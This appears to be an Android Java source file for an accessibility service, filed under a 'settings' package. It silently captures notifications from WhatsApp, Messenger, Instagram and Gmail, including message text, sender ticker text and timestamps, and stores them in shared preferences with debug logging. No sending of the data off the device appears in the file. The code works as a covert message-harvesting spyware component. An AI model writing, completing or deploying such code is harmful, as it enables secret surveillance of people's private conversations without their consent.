package com.example.settings;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.os.Parcelable;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.widget.RemoteViews;
import android.widget.Toast;

import java.lang.reflect.Field;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class Notifications extends AccessibilityService {
    Sharedpref mSharedpref;
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        if(event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            mSharedpref = new Sharedpref(getApplicationContext());
            //Toast.makeText(this, "Notification Catched", Toast.LENGTH_LONG).show();
        /*  if (event.getPackageName().toString().equals("com.whatsapp")){

                StringBuilder message = new StringBuilder();
                if (!event.getText().isEmpty()) {
                    for (CharSequence subText : event.getText()) {
                        message.append(subText);
                        Log.d("Message",message.toString());
                    }

                    // Message from +12345678

                }
              Log.d("Tortuga","Recieved event");*/
            Parcelable data = event.getParcelableData();
            StringBuilder mBuilder = new StringBuilder();
            String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
            String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
            if (data instanceof android.app.Notification) {
                Log.d("Tortuga", "Recieved notification");
                android.app.Notification notification = (android.app.Notification) data;
                CharSequence[] lines = notification.extras.getCharSequenceArray(android.app.Notification.EXTRA_TEXT_LINES);
                int i = 0;
                String text = mSharedpref.getNotificationData();

                StringBuilder line = new StringBuilder();
                if (lines != null) {
                    for (CharSequence msg : lines) {
                        line.append("," +msg);
                        Log.d("Line " + i, ""+ msg);
                        i += 1;
                    }
                }
                Log.d("Tortuga", "ticker: " + notification.tickerText);
                Log.d("Tortuga", "icon: " + event.getPackageName());
                Log.d("Tortuga", "notification: " + event.getText());
                String DaysTime = currentDate + "[" + currentTime + "]";
                mBuilder.append("," + text + "[" + DaysTime + "{" + notification.tickerText + "," + event.getPackageName() + "," + event.getText() + ",{" + line.toString() + "}" + "}" + "]");
            }
            mSharedpref.setNotificationData(mBuilder.toString());
            mSharedpref.commit();
        }
    }
    @Override
    public void onInterrupt() {

    }

    @Override
    protected void onServiceConnected() {
        // Set the type of events that this service wants to listen to.  Others
        // won't be passed to this service.
       // Toast.makeText(this,"Service connected", Toast.LENGTH_LONG).show();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;;
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED ;
       info.packageNames = new String[] {"com.whatsapp","com.facebook.orca","com.instagram.android","com.google.android.gm"};
       // info.notificationTimeout = 100;
        this.setServiceInfo(info);
    }
}
